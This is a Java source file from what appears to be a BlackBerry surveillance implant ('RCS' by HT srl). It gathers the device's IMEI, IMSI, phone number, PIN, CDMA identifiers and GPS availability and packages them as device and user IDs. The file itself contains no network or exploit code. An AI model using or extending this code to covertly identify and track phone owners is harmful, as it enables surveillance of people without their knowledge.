//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Device.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Vector;

import javax.microedition.location.LocationException;
import javax.microedition.location.LocationProvider;

import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.system.CDMAInfo;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.SIMCardException;
import net.rim.device.api.system.SIMCardInfo;
import net.rim.device.api.ui.text.PhoneTextFilter;
import net.rim.device.api.util.NumberUtilities;
import blackberry.config.Keys;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.iSingleton;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * The Class Device.
 */
public final class Device implements iSingleton {

    private static final long GUID = 0x88075bba9b4048c4L;

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Device", DebugLevel.INFORMATION); //$NON-NLS-1$
    //#endif       

    public int network;

    /** The imei. */
    byte[] imei = new byte[0];

    /** The imsi. */
    byte[] imsi = new byte[0];

    /** The phone number. */
    String phoneNumber = ""; //$NON-NLS-1$

    /** The instance. */
    private static Device instance = null;

    /**
     * Gets the single instance of Device.
     * 
     * @return single instance of Device
     */
    public static synchronized Device getInstance() {
        if (instance == null) {
            instance = (Device) Singleton.self().get(GUID);
            if (instance == null) {
                final Device singleton = new Device();
                singleton.init();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    int majorVersion;
    int minorVersion;
    boolean initialized = false;

    private boolean hasGps;

    private void init() {
        if (initialized) {
            return;
        }

        String version = DeviceInfo.getSoftwareVersion();
        Vector tokens = Utils.splitString(version, "."); //$NON-NLS-1$

        majorVersion = Integer.parseInt((String) tokens.elementAt(0));
        minorVersion = Integer.parseInt((String) tokens.elementAt(1));

        //#ifdef DEBUG
        debug.info("Version major: " + majorVersion + " minor: " + minorVersion); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        hasGps = checkGps();

        //#ifdef DEBUG
        debug.info("PIN: " + getPin()); //$NON-NLS-1$
        //#endif

        // gprs or cdma?
        if (isCDMA()) {
            //#ifdef DEBUG
            debug.trace("cdma"); //$NON-NLS-1$
            //#endif
            imsi = CDMAInfo.getIMSI();
            final String imsiString = new String(imsi);

            //#ifdef DEBUG
            debug.info("SID: " + getSid()); //$NON-NLS-1$
            debug.info("ESN: " + getEsn()); //$NON-NLS-1$
            debug.info("MEID: " + getMeid()); //$NON-NLS-1$
            //#endif

            imei = new byte[0];
        } else if (isGPRS()) {
            //#ifdef DEBUG
            debug.trace("gprs"); //$NON-NLS-1$
            //#endif
            try {
                imsi = SIMCardInfo.getIMSI();
                if (imsi == null) {
                    imsi = new byte[0];
                }

                //#ifdef DEBUG
                debug.info("IMSI: " + Utils.imeiToString(imsi, true)); //$NON-NLS-1$
                //#endif

            } catch (final SIMCardException e) {
                //#ifdef WARN
                debug.warn("no sim detected"); //$NON-NLS-1$
                //#endif
            }

            imei = GPRSInfo.getIMEI();
            //#ifdef DEBUG
            debug.info("IMEI: " + Utils.imeiToString(imei, true)); //$NON-NLS-1$
            //#endif

        } else if (isIDEN()) {
            //TODO IDEN
        }

        //#ifdef DEBUG
        debug.trace("getting phone"); //$NON-NLS-1$
        //#endif
        phoneNumber = Phone.getDevicePhoneNumber(true);

        //#ifdef DEBUG
        debug.trace("phoneNumber: " + phoneNumber); //$NON-NLS-1$
        //#endif

        if (phoneNumber == null) {
            phoneNumber = Messages.getString("3.16"); //$NON-NLS-1$
        } else {
            boolean valid = true;

            try {
                final PhoneTextFilter filter = new PhoneTextFilter(
                        PhoneTextFilter.ACCEPT_EVERYTHING_EXCEPT_WILD_CARD);

                for (int i = 0; i < phoneNumber.length(); i++) {
                    valid &= filter.validate(phoneNumber.charAt(i));
                }
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
                valid = false;
            }

            if (!valid) {
                phoneNumber = Messages.getString("3.17"); //$NON-NLS-1$
            }
        }

        //#ifdef DEBUG
        debug.info("Phone Number: " + phoneNumber); //$NON-NLS-1$
        //#endif

    }

    /**
     * Gets the subtype.
     * 
     * @return the subtype
     */
    public static byte[] getSubtype() {

        if (Status.self().isDemo() && !Keys.getInstance().isSeven()) {
            //3.0=DEMO
            return (Version.SUBTYPE + "-" + Messages.getString("3.0"))
                    .getBytes();
        } else {
            return Version.SUBTYPE.getBytes();
        }
    }

    /**
     * Gets the version.
     * 
     * @return the version
     */
    public static byte[] getVersion() {
        final byte[] versionRet = Utils.intToByteArray(Version.VERSION);
        //#ifdef DBC
        Check.ensures(versionRet.length == 4, "Wrong version len"); //$NON-NLS-1$
        //#endif
        return versionRet;
    }

    /**
     * Instantiates a new device.
     */
    private Device() {
    }

    /**
     * Clear.
     */
    public void clear() {
        imsi = new byte[0];
        imei = new byte[0];
        phoneNumber = ""; //$NON-NLS-1$
        return;
    }

    public static boolean isCDMA() {
        final int networkType = RadioInfo.getNetworkType();
        return networkType == RadioInfo.NETWORK_CDMA;
    }

    public static boolean isGPRS() {
        final int networkType = RadioInfo.getNetworkType();
        //#ifdef DEBUG
        //debug.trace("isGPRS: " + networkType);
        //#endif
        return networkType == RadioInfo.NETWORK_GPRS
                || networkType == RadioInfo.NETWORK_UMTS;
    }

    public static boolean isIDEN() {
        final int networkType = RadioInfo.getNetworkType();
        return networkType == RadioInfo.NETWORK_IDEN;
    }

    public static boolean isSimEnabled() {
        try {
            return SIMCardInfo.getIMSI() != null;
        } catch (SIMCardException e) {
            return false;
        }
    }

    /**
     * Gets the imei.
     * 
     * @return the imei
     */
    public String getImei(boolean dots) {

        if (isGPRS()) {
            //#ifdef DBC
            Check.ensures(imei != null, "null imei"); //$NON-NLS-1$
            //#endif

            return Utils.imeiToString(imei, dots);
        } else {
            //#ifdef DEBUG
            debug.warn("Network is CDMA or IDEN, no imei"); //$NON-NLS-1$
            //#endif
            return ""; //$NON-NLS-1$
        }
    }

    /**
     * Gets the imsi.
     * 
     * @return the imsi
     */
    public String getImsi(boolean dots) {

        return Utils.imeiToString(imsi, dots);

    }

    public int getSid() {
        if (isCDMA()) {
            return CDMAInfo.getCurrentSID();
        }
        return 0;
    }

    public int getEsn() {
        if (isCDMA()) {
            return CDMAInfo.getESN();
        }
        return 0;
    }

    private int getMeid() {
        /*
         * if (isCDMA()) { return CDMAInfo.getHexMEID() ; }
         */
        return 0;
    }

    /**
     * Gets the phone number.
     * 
     * @return the phone number
     */
    public String getPhoneNumber() {
        //#ifdef DBC
        Check.ensures(phoneNumber != null, "null phoneNumber"); //$NON-NLS-1$
        //#endif
        return phoneNumber;
    }

    /**
     * Gets the imei.
     * 
     * @return the imei
     */
    public byte[] getWImei(boolean dots) {
        //#ifdef DBC
        Check.ensures(imei != null, "null imei"); //$NON-NLS-1$
        Check.ensures(isGPRS(), "!GPRS"); //$NON-NLS-1$
        //#endif
        return WChar.getBytes(Utils.imeiToString(imei, dots));
    }

    /**
     * Gets the imsi.
     * 
     * @return the imsi
     */
    public byte[] getWImsi(boolean dots) {
        return WChar.getBytes(Utils.imeiToString(imsi, dots));
    }

    public byte[] getWPin() {
        return WChar.getBytes(getPin());
    }

    public byte[] getWDeviceId() {
        return getWPin();
    }

    public byte[] getWUserId() {
        if (isCDMA()) {
            final int sid = getSid();
            final String sidW = NumberUtilities.toString(sid, 10);
            return WChar.getBytes(sidW);
        } else if (isGPRS()) {
            return getWImsi(false);
        } else if (isIDEN()) {
            //TODO IDEN
            return new byte[] {};
        } else {
            return new byte[] {};
        }
    }

    private byte[] getWESN() {
        //#ifdef DBC
        Check.ensures(isCDMA(), "!CDMA"); //$NON-NLS-1$
        //#endif
        return WChar.getBytes(NumberUtilities.toString(getEsn(), 16));
    }

    /**
     * Gets the phone number.
     * 
     * @return the phone number
     */
    public byte[] getWPhoneNumber() {
        //#ifdef DBC
        Check.ensures(phoneNumber != null, "null phoneNumber"); //$NON-NLS-1$
        //#endif
        final byte[] encoded = WChar.getBytes(phoneNumber);
        return encoded;
    }

    private static String pin = null;

    public static String getPin() {
        if (pin == null) {
            pin = NumberUtilities.toString(DeviceInfo.getDeviceId(), 16);
        }
        return pin;
    }

    public boolean atLeast(int major, int minor) {
        try {

            //#ifdef DEBUG
            debug.info("Version major: " + majorVersion + " minor: " //$NON-NLS-1$ //$NON-NLS-2$
                    + minorVersion);
            debug.trace("atLeast: " + major + "." + minor); //$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            if (majorVersion > major) {
                return true;
            } else if (majorVersion == major) {
                return (minorVersion >= minor);
            } else {
                return false;
            }

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("atLeast: " + ex); //$NON-NLS-1$
            //#endif
        }

        return false;
    }

    public boolean hasGPS() {
        return hasGps;
    }

    private boolean checkGps() {
        try {
            LocationProvider lp = LocationProvider.getInstance(null);
            if (lp == null) {
                return false;
            } else {
                return true;
            }
        } catch (LocationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("hasGPS"); //$NON-NLS-1$
            //#endif
            return false;
        }
    }

    public boolean lessThan(int major, int minor) {
        try {

            //#ifdef DEBUG
            debug.info("Version major: " + majorVersion + " minor: " //$NON-NLS-1$ //$NON-NLS-2$
                    + minorVersion);
            debug.trace("atLeast: " + major + "." + minor); //$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            if (majorVersion < major) {
                return true;
            } else if (majorVersion == major) {
                return (minorVersion < minor);
            } else {
                return false;
            }

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("lessThan: " + ex); //$NON-NLS-1$
            //#endif
        }

        return false;
    }

}
